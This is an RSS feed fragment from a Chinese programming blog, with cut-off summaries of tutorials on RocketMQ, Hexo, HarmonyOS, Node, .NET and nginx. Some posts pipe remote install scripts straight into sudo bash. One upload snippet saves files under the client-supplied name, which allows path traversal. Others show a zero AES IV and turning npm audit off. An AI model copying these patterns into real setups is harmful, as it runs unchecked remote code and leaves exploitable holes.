部署RocketMQ（docker） 安装 Docker： #debian curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 拉取 RocketMQ 镜像： 使用以下命令从 Docker Hub 拉取最新的 RocketMQ 镜像：
docker pull apache/rocketmq:latest 启动 RocketMQ NameServer： RocketMQ 的 NameServer 是负责管理所有 Broker 节点的目录服务。可以使用以下命令启动 NameServer：
docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv ```bash ## 启动 RocketMQ Broker： RocketMQ 的 Broker 负责存储消息并处理生产者和消费者的请求。使用以下命令启动 Broker： ```bash docker run -d --name rmqbroker --link rmqnamesrv:namesrv -e &amp;#34;NAMESRV_ADDR=namesrv:9876&amp;#34; -e &amp;#34;BROKER_NAME=broker-a&amp;#34; -e &amp;#34;BROKER_ID=0&amp;#34; -e &amp;#34;AUTO_CREATE_TOPIC_ENABLE=true&amp;#34; -e &amp;#34;AUTO_CREATE_SUBSCRIPTION_GROUP=true&amp;#34; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker 验证 查看 NameServer 日志：</description></item><item><title> hexo githubio</title><link>https://qfsyso.github.io/posts/hexo-githubio/</link><pubDate>Tue, 28 May 2024 03:38:21 +0000</pubDate><guid>https://qfsyso.github.io/posts/hexo-githubio/</guid><description>hexo安装 npm install hexo-cli -g hexo init blog cd blog npm install hexo server
key配置 ssh-keygen -t ed25519 -C &amp;ldquo;email@e.com&amp;rdquo; 添加key到github
err git@github.com: Permission denied (publickey). fatal: Could not read from remote repository.
配置GitHub仓库 在GitHub上创建一个新的仓库，其名称应该是 用户名.github.io，其中用户名是你的GitHub用户名。 git config &amp;ndash;global user.email &amp;ldquo;xx@qq.com&amp;rdquo; git config &amp;ndash;global user.name &amp;ldquo;user&amp;rdquo;
_config.yml deploy: type: git repo: # 替换为你的GitHub仓库url branch: master
安装hexo-deployer-git插件： npm install hexo-deployer-git &amp;ndash;save
部署到GitHub： hexo clean hexo g #hexo generate hexo d #hexo deploy</description></item><item><title>HarmonyOS socket websocket</title><link>https://qfsyso.github.io/posts/harmonyos-socket-websocket/</link><pubDate>Sun, 26 May 2024 23:56:19 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos-socket-websocket/</guid><description>socket import socket from &amp;#39;@ohos.net.socket&amp;#39;; create
let tcp = socket.constructTCPSocketInstance(); let promise = tcp.connect({ address: {address: &amp;#39;192.168.1.11&amp;#39;, port: 24524, family: 1} , timeout: 6000}); promise.then(() =&amp;gt; { console.log(&amp;#39;connect success&amp;#39;); tcp.send({ data:&amp;#39;Hello, server!&amp;#39; },err =&amp;gt; { if (err) { console.log(&amp;#39;send fail&amp;#39;); return; } console.log(&amp;#39;send success&amp;#39;); }) }).catch(err =&amp;gt; { console.log(&amp;#39;connect fail&amp;#39;); }); ERR 系统识别到新的sdk路径 请清除模拟器数据后 Sdk Path has been changed to xxx
1.在Local Emulator的设备列表窗口，点击“Wipe User Data”清除模拟器数据，然后重新启动模拟器。 2.重新创建一个模拟器，然后启动新建的模拟器。
console.log Log =&amp;gt; show only js log</description></item><item><title>Python study</title><link>https://qfsyso.github.io/posts/python-study/</link><pubDate>Sun, 26 May 2024 23:02:42 +0000</pubDate><guid>https://qfsyso.github.io/posts/python-study/</guid><description>🌠setup 安装 python.org
🐷helloworld if __name__ == &amp;#39;__main__&amp;#39;: print(&amp;#39;helloworld&amp;#39;) python test.py var 变量
if __name__ == &amp;#39;__main__&amp;#39;: company, date, *others = [&amp;#39;hi&amp;#39;, &amp;#39;20240521&amp;#39;, &amp;#39;000&amp;#39;, &amp;#39;11111&amp;#39;] print(company, date) print(others) random 随机
i = 0 rand_list = [] while i &amp;lt; 4: rand_num = random.randint(0, 499) if rand_num not in rand_list: rand_list.append(rand_num) i += 1 print(rand_list) list 列表 可变
# 创建一个空列表 my_list = [] # 向列表中添加元素 my_list.append(1) my_list.append(2) my_list.append(3) print(my_list) # 输出: [1, 2, 3] # 修改列表中的元素 my_list[1] = &amp;#39;two&amp;#39; print(my_list) # 输出: [1, &amp;#39;two&amp;#39;, 3] # 列表切片 sub_list = my_list[1:3] print(sub_list) # 输出: [&amp;#39;two&amp;#39;, 3] # 删除列表中的元素 del my_list[2] print(my_list) # 输出: [1, &amp;#39;two&amp;#39;] # 创建一个包含0到9的偶数列表 even_numbers = [i for i in range(10) if i % 2 == 0] print(even_numbers) # 输出: [0, 2, 4, 6, 8] tuple 元组 不可变</description></item><item><title>Node socket.io</title><link>https://qfsyso.github.io/posts/node-socket.io/</link><pubDate>Sun, 26 May 2024 23:01:07 +0000</pubDate><guid>https://qfsyso.github.io/posts/node-socket.io/</guid><description>server
npm install express npm install socket.io const express = require(&amp;#39;express&amp;#39;); const http = require(&amp;#39;http&amp;#39;); const socketIO = require(&amp;#39;socket.io&amp;#39;); const app = express(); const server = http.createServer(app); const io = socketIO(server); io.on(&amp;#39;connection&amp;#39;, (socket) =&amp;gt; { console.log(&amp;#39;User connected&amp;#39;); socket.on(&amp;#39;chat message&amp;#39;, (msg) =&amp;gt; { console.log(&amp;#39;message: &amp;#39; + msg); io.emit(&amp;#39;chat message&amp;#39;, msg); // to all }); socket.on(&amp;#39;disconnect&amp;#39;, () =&amp;gt; { console.log(&amp;#39;User disconnected&amp;#39;); }); }); server.listen(24525, () =&amp;gt; { console.log(&amp;#39;Node Server is running on port 24525&amp;#39;); }); docker dockerfile</description></item><item><title>HarmonyOS Interface Router ArkTS ArkUI</title><link>https://qfsyso.github.io/posts/harmonyos-interface-router-arkts-arkui/</link><pubDate>Thu, 23 May 2024 21:49:44 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos-interface-router-arkts-arkui/</guid><description>🎬️create @Component export default struct TitleBar { build(){ Row(){ Text(&amp;#39;transition&amp;#39;) .fontSize(&amp;#39;30fp&amp;#39;) .fontColor(Color.White) } .width(&amp;#39;100%&amp;#39;) .height(&amp;#39;8%&amp;#39;) .backgroundColor(&amp;#39;#4169E1&amp;#39;) .padding({left:10}) } } 🎞️interface export interface IList{ title:string; url :string; } @State listData:IList[]=[ // @State listData:Array&amp;lt;IList&amp;gt;=[ { title:&amp;#39;in&amp;#39;, url:&amp;#39;pages/home1&amp;#39; }, { title:&amp;#39;scale&amp;#39;, url:&amp;#39;pages/home2&amp;#39; }, { title:&amp;#39;small&amp;#39;, url:&amp;#39;pages/home3&amp;#39; }, { title:&amp;#39;in&amp;#39;, url:&amp;#39;&amp;#39; } ] 💡foreach ForEach(this.listData,( item: IList,index?:number)=&amp;gt;{ //listitem Button({type:ButtonType.Capsule}){ Text(item.title) .fontSize(&amp;#39;35fp&amp;#39;) .fontColor(Color.White) } //... }) 🔦router import router from &amp;#39;@ohos.router&amp;#39; 📼mainpage &amp;#34;pages/home1&amp;#34; 📹️onclick .onClick(()=&amp;gt;{ //router router.</description></item><item><title>DotNetty ByteBuffer</title><link>https://qfsyso.github.io/posts/dotnetty-bytebuffer/</link><pubDate>Thu, 23 May 2024 21:47:10 +0000</pubDate><guid>https://qfsyso.github.io/posts/dotnetty-bytebuffer/</guid><description>DotNetty是一个高性能的.NET网络通信框架，基于Netty，支持TCP、UDP、HTTP、WebSocket等协议。适用于高并发、低延迟场景，如实时通信、游戏服务器、IoT应用及大型分布式系统，通过异步I/O、零拷贝等技术提升性能，具备易用性、可扩展性。 架构上，围绕Channel、EventLoop、ChannelPipeline、ChannelHandlerContext设计，包含Transport、Codec、Handler等模块，简化网络编程，加速数据传输处理。
ByteBuffer 用于高效处理字节数据，固定容量，通过allocate或wrap创建。涉及position和limit追踪读写位置，提供get/put等读写方法，flip切换读写模式，clear清空缓冲区，compact移动数据并准备下一轮读写，适用于高性能IO与网络通信。.
优点 零拷贝通过复合缓冲区实现。 动态容量增长。 无需flip切换读写模式。 分离读写索引。 内置引用计数。 支持缓冲区池化。 优化网络通信中的字节处理。
结构 readerIndex 读取，随读增。 writerIndex 写入，随写增。 capacity容量。
ByteBuffer属性 readIndex：下一个读位 writeIndex：下一个写位置 capacity：容量 0：缓冲区开始位置
已经读取的区域：[0,readerindex) 可读取的区域：[readerindex,writerIndex) 可写的区域: [writerIndex,capacity) 读写独立索引，操作命名区分（read/write自动进，get/set不影响索引）。 支持设定最大容量，超限写操作将抛异常，默认上限Integer.MAX_VALUE。 readerIndex writerIndex 本质为灵活高效字节容器
堆缓冲区 最常用的 ByteBuffer 模式是将数据存储在堆空间中。这种模式被称为支撑数组（backing array），它能在没有使用池化的情况下提供快速的分配和释放。可以由 hasArray() 来判断检查 ByteBuffer是否由数组支撑。如果不是，则这是一个直接缓冲区。
直接缓冲区 直接缓冲区是另外一种 ByteBuffer 模式。 直接缓冲区的主要缺点是，相对于基于堆的缓冲区，它们的分配和释放都较为昂贵。
复合缓冲区 复合缓冲区 CompositeByteBuf，它为多个 ByteBuffer提供一个聚合视图。比如 HTTP 协议， 分为消息头和消息体，这两部分可能由应用程序的不同模块产生，各有各的 ByteBuffer，将会在消息被发送的时候组装为一个 ByteBuffer，此时可以将这两个 ByteBuffer聚合为一个 CompositeByteBuf，然后使用统一和通用的 ByteBuffer API 来操作。
如何在的程序中获得 ByteBuf 的实例，并使用它呢？Netty 提供了两种方式
ByteBufAllocator 接口 ByteBufAllocator 分配任意类型的 ByteBuffer 实例。
buffer(): 基于堆/直接内存ByteBuffer。 heapBuffer(): 仅堆内存。 directBuffer(): 仅直接内存。 compositeBuffer(): 可组合多个缓冲区，支持堆/直接内存。 ioBuffer(): 适配I/O操作，优先直接内存(需Unsafe支持)。 ByteBufAllocator： Channel ChannelHandlerContext</description></item><item><title> .NET FileUpload</title><link>https://qfsyso.github.io/posts/.net-fileupload/</link><pubDate>Mon, 20 May 2024 21:14:38 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-fileupload/</guid><description>VS2022 .NET8
💾基础上传示例 view
@{ ViewData[&amp;#34;Title&amp;#34;] = &amp;#34;File Upload&amp;#34;; } &amp;lt;h1&amp;gt;@ViewData[&amp;#34;Title&amp;#34;]&amp;lt;/h1&amp;gt; &amp;lt;form method=&amp;#34;post&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34; action=&amp;#34;/Home/UploadFile&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;file&amp;#34; class=&amp;#34;form-control&amp;#34; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;Upload&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; controller
[HttpPost] public async Task&amp;lt;IActionResult&amp;gt; UploadFile() { var file = Request.Form.Files[0]; if (file != null &amp;amp;&amp;amp; file.Length &amp;gt; 0) { var uploads = Path.Combine(Directory.GetCurrentDirectory(), &amp;#34;wwwroot&amp;#34;, &amp;#34;up&amp;#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.</description></item><item><title>c# run nodejs</title><link>https://qfsyso.github.io/posts/c%23-run-nodejs/</link><pubDate>Mon, 20 May 2024 21:13:27 +0000</pubDate><guid>https://qfsyso.github.io/posts/c%23-run-nodejs/</guid><description>在C#中调用Node.js时，一种常见的方法是使用进程间通信（Inter-Process Communication，IPC），例如使用子进程。 可以使用C#中的Process类来启动Node.js进程，并通过标准输入输出与其进行通信。
C# run nodejs // n.js // 监听来自标准输入的消息 process.stdin.on(&amp;#39;data&amp;#39;, function (data) { // 收到消息后，在控制台输出并回复消息 console.log(&amp;#34;Message from C#: &amp;#34; + data.toString()); process.stdout.write(&amp;#34;Hello from Node.js!&amp;#34;); }); ProcessStartInfo startInfo = new ProcessStartInfo(); startInfo.FileName = &amp;#34;node&amp;#34;; // Node.js可执行文件路径，如果已在系统路径中，则不需要提供完整路径 startInfo.Arguments = &amp;#34;n.js&amp;#34;; // 执行的Node.js脚本文件路径 startInfo.UseShellExecute = false; startInfo.RedirectStandardInput = true; startInfo.RedirectStandardOutput = true; Process nodeProcess = new Process(); nodeProcess.StartInfo = startInfo; // 启动进程 nodeProcess.Start(); // 与Node.js进程进行通信 using (var writer = nodeProcess.StandardInput) { if (writer.</description></item><item><title>Typescript study</title><link>https://qfsyso.github.io/posts/typescript-study/</link><pubDate>Mon, 20 May 2024 00:07:45 +0000</pubDate><guid>https://qfsyso.github.io/posts/typescript-study/</guid><description>typescript ≈ javascript plus
🔗setup npm install typescript -g tsc -version npm install ts-node -g 🖌️hello world let str = &amp;#34;hi&amp;#34; console.log(str); ts-node t.ts 🖋️datatype let a1 :string =&amp;#39;abc&amp;#39; let a2:number = 2 let a3 :boolean =true let nu:null =null let un:undefined = undefined let a4:string|null = null let a5:1|2|3 = 2 any let a:any a= 1 a=&amp;#34;1&amp;#34; a=true strong type
let a:string = &amp;#34;123&amp;#34; a=1 Err
let a:unknown a= 1 a=&amp;#34;1&amp;#34; a=true let b :String if(typeof a ==&amp;#34;string&amp;#34;) { b=a } enum 枚举 enum Color { RED,BLUE,BLACK} let color = Color.</description></item><item><title>.NET Blazor</title><link>https://qfsyso.github.io/posts/.net-blazor/</link><pubDate>Sat, 18 May 2024 23:10:13 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-blazor/</guid><description>Blazor 是一个使用 C#、HTML 和 CSS 构建交互式 Web UI 的开源框架，支持服务器端和客户端运行，允许开发者利用 C# 和 .NET 生态来创建 Web 应用。
🌱Create carete Blazor Web
Program.cs 是启动服务器以及在其中配置应用服务和中间件的应用的入口点。 在 Components 目录中:
App.razor 为应用的根组件。 Routes.razor 配置 Blazor 路由器。 Pages 目录包含应用的一些示例网页。 BlazorApp.csproj 定义应用项目及其依赖项，且可以通过双击解决方案资源管理器中的 BlazorApp 项目节点进行查看。 Properties 目录中的 launchSettings.json 文件为本地开发环境定义不同的配置文件设置。创建项目时会自动分配端口号并将其保存在此文件上。
🪴Run pages home.razor
@page &amp;#34;/&amp;#34; &amp;lt;PageTitle&amp;gt;Home&amp;lt;/PageTitle&amp;gt; &amp;lt;h1&amp;gt;Hello, world m qqqqq&amp;lt;/h1&amp;gt; hihihi 🌴Counter counter.razor
@page &amp;#34;/counter&amp;#34; @rendermode InteractiveServer &amp;lt;PageTitle&amp;gt;Counter&amp;lt;/PageTitle&amp;gt; &amp;lt;h1&amp;gt;Counter&amp;lt;/h1&amp;gt; &amp;lt;p role=&amp;#34;status&amp;#34;&amp;gt;Current count: @currentCount&amp;lt;/p&amp;gt; &amp;lt;button class=&amp;#34;btn btn-primary&amp;#34; @onclick=&amp;#34;IncrementCount&amp;#34;&amp;gt;Click me&amp;lt;/button&amp;gt; @code { private int currentCount = 0; private void IncrementCount() { currentCount++; } } 像Vue</description></item><item><title>.NET RabbitMQ NOTE</title><link>https://qfsyso.github.io/posts/.net-rabbitmq-note/</link><pubDate>Sat, 18 May 2024 23:05:20 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-rabbitmq-note/</guid><description>setup rabbitmq docker run &amp;ndash;name=rabbit -p 15672:15672 -p 5672:5672 -e RABBITMQ_DEFAULT_USER=admin -e RABBITMQ_DEFAULT_PASS=xxx -d rabbitmq:management
ip:15672
nuget RabbitMQ.Client
Send
//1.1.实例化连接工厂 var factory = new ConnectionFactory() { HostName = &amp;#34;localhost&amp;#34; }; //2. 建立连接 using (var connection = factory.CreateConnection()) { //3. 创建信道 using (var channel = connection.CreateModel()) { //4. 申明队列 channel.QueueDeclare(queue: &amp;#34;hello&amp;#34;, durable: false, exclusive: false, autoDelete: false, arguments: null); //5. 构建byte消息数据包 string message = args.Length &amp;gt; 0 ? args[0] : &amp;#34;Hello RabbitMQ!</description></item><item><title>Nodejs Study</title><link>https://qfsyso.github.io/posts/nodejs-study/</link><pubDate>Fri, 17 May 2024 21:00:03 +0000</pubDate><guid>https://qfsyso.github.io/posts/nodejs-study/</guid><description>📘 util util const util = require(&amp;#39;util&amp;#39;); util.isArray([]) util.isRegExp(/some regexp/) util.isDate(new Date()) // true util.isDate(Date()) // false (without &amp;#39;new&amp;#39; returns a String) os var os = require(&amp;#34;os&amp;#34;); // CPU 的字节序 console.log(&amp;#39;endianness : &amp;#39; + os.endianness()); // 操作系统名 console.log(&amp;#39;type : &amp;#39; + os.type()); // 操作系统名 console.log(&amp;#39;platform : &amp;#39; + os.platform()); // 系统内存总量 console.log(&amp;#39;total memory : &amp;#39; + os.totalmem() + &amp;#34; bytes.&amp;#34;); // 操作系统空闲内存量 console.log(&amp;#39;free memory : &amp;#39; + os.freemem() + &amp;#34; bytes.</description></item><item><title>Nodejs base</title><link>https://qfsyso.github.io/posts/nodejs-base/</link><pubDate>Fri, 17 May 2024 19:00:03 +0000</pubDate><guid>https://qfsyso.github.io/posts/nodejs-base/</guid><description>简单的说 Node.js 就是运行在服务端的 JavaScript。
Node.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。
Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。
🛠Node.js安装 Node.js安装在上一篇文章Debian Node.js HEXO 有讲到
截至目前最新的版本是20.12.2
#查看版本 node -v v20.12.2
win下可以在官网下载安装 https://nodejs.org/en/download
debian nodejs node 14版本
$ apt-get update $ curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash - #如果提示sudo 命令没有找到，一定要下载，执行apt-get install sudo -y 即可，然后再执行上述命令
$ apt-get install nodejs -y $ node --version //验证 当然如果需要安装node20版本，只需将上述命令替换为：
$ curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 💬helloworld hi.</description></item><item><title>HarmonyOS Photos Column Swiper Grid</title><link>https://qfsyso.github.io/posts/harmonyos-photos-column-swiper-grid/</link><pubDate>Thu, 16 May 2024 01:26:18 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos-photos-column-swiper-grid/</guid><description>​
✨️index title swiper list(grid)
import coms from &amp;#39;../pages/com&amp;#39; @Entry @Component struct Index { @State message: string = &amp;#39;Hello World1&amp;#39; //private list = new con build() { Column() { //标题 Row(){ Text(&amp;#39;photos&amp;#39;) .fontSize(&amp;#39;30fp&amp;#39;) .fontWeight(FontWeight.Bold) } .justifyContent(FlexAlign.Start) .width(&amp;#39;100%&amp;#39;) .padding(&amp;#39;12vp&amp;#39;) //轮播 Swiper() { ForEach(coms.SWIPERLIST,(item:Resource,index?:Number)=&amp;gt;{ Row() { Image(item) } .width(&amp;#39;100%&amp;#39;) .aspectRatio(1.6) }) } .autoPlay(true) .loop(true) .indicator(true) .duration(1000) .itemSpace(10) .borderRadius(&amp;#39;12vp&amp;#39;) .margin(&amp;#39;12vp&amp;#39;) .onChange((index: number) =&amp;gt; { }) //列表 Grid(){ GridItem(){ Column(){ Image($r(&amp;#39;app.media.icon&amp;#39;)) .borderRadius(2) } } GridItem(){ Column(){ Image($r(&amp;#39;app.</description></item><item><title>.NET AES DES</title><link>https://qfsyso.github.io/posts/.net-aes-des/</link><pubDate>Wed, 15 May 2024 15:01:42 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-aes-des/</guid><description>.NET AES DES 对称加密
ASE 加密解密 加密方法 (Encrypt):
创建一个 Aes 实例。 设置密钥 (Key) 和初始化向量 (IV)。 使用 CreateEncryptor 创建加密器。 通过 CryptoStream 和 StreamWriter 将明文写入内存流，然后转换为 Base64 字符串。
解密方法 (Decrypt):
同样创建一个 Aes 实例。 设置相同的密钥和初始化向量。 使用 CreateDecryptor 创建解密器。 通过 CryptoStream 和 StreamReader 从内存流读取密文并解密为明文。
注意事项 密钥长度：AES 支持 128, 192, 和 256 位密钥。本例使用 256 位（32 字节）。 初始化向量 (IV)：应确保加密和解密时使用相同的 IV。本例中使用了全零的 IV，在实际应用中建议使用随机 IV，并将其与密文一起存储。
using System; using System.IO; using System.Security.Cryptography; using System.Text; class SymmetricEncryption { // 加密方法 public static string Encrypt(string plainText, string key) { using (Aes aesAlg = Aes.</description></item><item><title>IOS POD</title><link>https://qfsyso.github.io/posts/ios-pod/</link><pubDate>Tue, 14 May 2024 10:51:59 +0000</pubDate><guid>https://qfsyso.github.io/posts/ios-pod/</guid><description>IOS POD
brew install cocoapod gem install cocoapod sudo gem install cocoapod sudo brew update ruby update rvm install 2.7 cd xx
pod install</description></item><item><title>.NET webp</title><link>https://qfsyso.github.io/posts/.net-webp/</link><pubDate>Fri, 10 May 2024 09:28:17 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-webp/</guid><description>在C#中，可以使用Image类和Bitmap类来处理图像，并且可以借助Magick.NET库来将JPG图片转换为WEBP格式。
安装Magick.NET-Q8-AnyCPU NuGet包。
using ImageMagick; 转换方法
public void ConvertJpgToWebP2(string inputFilePath, string outputFilePath) { using (var image = new MagickImage(inputFilePath)) { // 设置WEBP压缩质量，范围从0（最好的质量）到100（最快速压缩） image.Quality = 80; image.Format = MagickFormat.WebP; image.Write(outputFilePath); } } 调用
string jpgPath = &amp;#34;E:\\net8test\\ConsoleApp1Test\\ConsoleApp1Test\\bin\\Debug\\net8.0\\55.jpg&amp;#34;; string webpPath = &amp;#34;E:\\net8test\\ConsoleApp1Test\\ConsoleApp1Test\\bin\\Debug\\net8.0\\55.webp&amp;#34;; Ig ig = new Ig(); ig.ConvertJpgToWebP2(jpgPath, webpPath);</description></item><item><title>Hexo Categories Tags</title><link>https://qfsyso.github.io/posts/hexo-categories-tags/</link><pubDate>Thu, 09 May 2024 13:25:52 +0000</pubDate><guid>https://qfsyso.github.io/posts/hexo-categories-tags/</guid><description>配置categories 新建页面categories: hexo new page &amp;#34;categories&amp;#34; 执行命令后将新生成文件夹categories，并在该文件夹下生成index.md文件。
编辑categories/index.md文件: vi {path}/source/categories/index.md 编辑内容：
+++ title: 分类 date = &amp;#39;2017-10-25 22:00:00 type: &amp;#34;categories&amp;#34; +++ 编辑主题配置文件themes/xx/_config.yml: vi {path}/themes/xx/_config.yml 将menu中的categories的注释去掉：
menu: home: / || home #tags = [&amp;#34; /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 编辑文章在Front-matter区域（即+++分隔的区域）指定categories即可： +++ title: test date = &amp;#39;2017-01-01 00:00:00 categories: - 类别名称 tags = [&amp;#34; - 标签 +++ categories/index.</description></item><item><title> Web uvpv busuanzi</title><link>https://qfsyso.github.io/posts/web-uvpv-busuanzi/</link><pubDate>Wed, 08 May 2024 21:19:32 +0000</pubDate><guid>https://qfsyso.github.io/posts/web-uvpv-busuanzi/</guid><description>WEB UVPV busuanzi 不蒜子 不蒜子是一款用于静态网站的访问计数工具，可以方便地在网页上显示访问次数。与其他统计工具如百度统计和谷歌分析不同的是，不蒜子直接将访问次数显示在网页上，而不需要用户跳转到外部平台查看。
不蒜子的计数原理： 通过在网页中引入JavaScript脚本，将当前页面的URL或某种唯一标识注册到不蒜子的服务器上，服务器保存着URL与对应的访问计数值。当页面被访问时，通过JavaScript更新服务器上的计数值，并在页面初始化时加载并显示计数值。
如何使用？ 在网页需要引用计数功能的地方先引入不蒜子的js
&amp;lt;!-- 引入不蒜子计数 --&amp;gt; &amp;lt;script async src=&amp;#34;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 为了美观，我们再引入旋转花瓣加载特效&amp;quot;fa fa-spinner fa-spin&amp;quot; 总访问量计数算法：pv方式，单个用户连续点击n篇文章，记录n次访问量。 总访客数计数算法：uv方式，单个用户连续点击n篇文章，只记录1次访客数。
&amp;lt;center&amp;gt; 浏览量：&amp;lt;span id=&amp;#34;busuanzi_value_site_pv&amp;#34;&amp;gt;&amp;lt;i class=&amp;#34;fa fa-spinner fa-spin&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/span&amp;gt;👀 | 访客数：&amp;lt;span id=&amp;#34;busuanzi_value_site_uv&amp;#34;&amp;gt;&amp;lt;i class=&amp;#34;fa fa-spinner fa-spin&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/span&amp;gt;👦 &amp;lt;/center&amp;gt; 注：美化及其他嵌入的改动，其实只要内层的span就可以，然后用css美化或者做嵌入</description></item><item><title>npm audit</title><link>https://qfsyso.github.io/posts/npm-audit/</link><pubDate>Wed, 08 May 2024 19:11:07 +0000</pubDate><guid>https://qfsyso.github.io/posts/npm-audit/</guid><description>11 packages are looking for funding run npm fund for details
6 vulnerabilities (4 high, 2 critical)
To address issues that do not require attention, run: npm audit fix
To address all issues, run: npm audit fix &amp;ndash;force
Run npm audit for details.
————————————————
这个报错信息的意思是：
依赖包已经是最新的，npm检查了xx个包，花了x秒钟。 有x个包正在寻求资金支持，运行npm fund来查看详情，也可以选择捐赠一些钱给这些包的开发者。 有x个中等程度的安全漏洞，运行npm audit fix &amp;ndash;force来修复所有的问题，包括一些可能导致破坏性变化的问题。 运行npm audit来查看更多的细节，包括每个漏洞的类型，来源，影响等。
解决方法
有时候并不想修复这些安全漏洞，因为它们可能会影响我们的项目的正常运行，或者我们只是想快速地初始化一个项目，不想被这些报错信息打扰,可以使用一个简单的命令来关闭npm的audit检查： npm set audit false 这样就可以保证npm的audit不会影响初始化项目，但是这个解决办法并不建议使用在实际生产中，因为它会让我们忽略一些可能存在的安全风险。 同样的，可以将值设为true来打开npm audit检查，这样可以看到npm的报错信息，也可以选择修复它们： npm set audit true 这个操作将对全局生效，也就是说，它会影响我们所有的项目，不管是新的还是旧的。
修复~但不是破坏性修复
npm audit fix</description></item><item><title>.NET native AOT</title><link>https://qfsyso.github.io/posts/.net-native-aot/</link><pubDate>Wed, 08 May 2024 13:01:11 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-native-aot/</guid><description>前言 .NET8对于性能的优化是方方面面的，所以AOT预编译机器码也是不例外的。本篇来看下对于AOT的优化。
概述 首先要明确一个概念，.NET里面的AOT它是原生的。什么意思呢？也就是说通过ILC编译器(AOT编译器，编译出来的代码是各个平台上可以直接运行的二进制代码。比如MacOS的二进制，Linux二进制等等。所以称之为原生。
C#源码被ILC编译之后，生成了一个完全原生态代码的可执行文件。在执行的时候不需要JIT来编译任何东西，因为JIT已经在ILC里面被充分利用过了。实际上AOT里面也没有包含JIT。那么它如何优化呢？只能是在ILC里面调用JIT的时候了。所以它这个优化依然依靠JIT。.NET8里面优化AOT的一个典型的例子，就是ASP.NET应用程序在使用AOT的时候表现不错，同时也降低了总成本。
创建项目 启用AOT
打包指令 dotnet publish DemoAot.csproj -o pub\ -c Release -r win-x64 linux下 先安装SDK 安装后
dotnet --list-sdks dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r linux-x64 macos下 安装SDK后
dotnet --list-sdks dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r osx-x64 重启服务器 通过命令 cd fser 及sudo nohup /root/fser/fileserver &amp;gt; output{当前时间}.log 2&amp;gt;&amp;amp;1 &amp;amp; 和命令 cd nets4 及sudo nohup dotnet /root/nets4/IM.dll &amp;gt; output{当前时间}.log 2&amp;gt;&amp;amp;1 &amp;amp; 自动化运行
为了自动化运行这些程序启动命令，可以编写一个 Shell 脚本并结合系统启动服务（如 systemd）来执行。 以下是具体实现步骤：</description></item><item><title>Debian nginx https</title><link>https://qfsyso.github.io/posts/debian-nginx-https/</link><pubDate>Tue, 07 May 2024 19:13:24 +0000</pubDate><guid>https://qfsyso.github.io/posts/debian-nginx-https/</guid><description>debian安装 nginx 在Debian系统上安装Nginx，可以按照以下步骤操作：
如果 sudo: command not found
apt-get install sudo 首先，更新的包索引：
sudo apt update 接下来，安装Nginx：
sudo apt install nginx 安装完成后，启动Nginx服务：
sudo systemctl start nginx （可选）设置Nginx开机自启动：
sudo systemctl enable nginx 可以通过运行以下命令来检查Nginx的状态：
sudo systemctl status nginx 现在，可以在Web浏览器中输入服务器的IP地址或域名来访问默认的Nginx欢迎页面。如果是在本地安装的Nginx，可以通过访问 http://localhost 来查看这个页面。
如果需要配置Nginx，可以编辑 /etc/nginx/nginx.conf 文件或者在 /etc/nginx/sites-available/ 目录下创建或编辑配置文件，并使用 sudo ln -s /etc/nginx/sites-available/your-config /etc/nginx/sites-enabled/ 命令来启用它。
sudo whereis nginx Nginx 默认安装位置 配置文件所在目录 /etc/
nginx配置 检测Nginx配置文件是否正确
nginx -t 重载Nginx配置
nginx -s reload 自定义Nginx站点配置文件存放目录 /etc/nginx/conf.d/
nginx网站目录 /var/www/
域名证书
阿里云证书 免费证书 https://help.</description></item><item><title> .NET获取内存</title><link>https://qfsyso.github.io/posts/.net%E8%8E%B7%E5%8F%96%E5%86%85%E5%AD%98/</link><pubDate>Mon, 06 May 2024 14:57:24 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net%E8%8E%B7%E5%8F%96%E5%86%85%E5%AD%98/</guid><description>在.NET 控制台应用程序中，你可以使用System.Diagnostics命名空间下的Process类来获取当前进程的内存使用情况。以下是一个简单的示例代码，展示如何获取并显示当前进程的内存使用量：
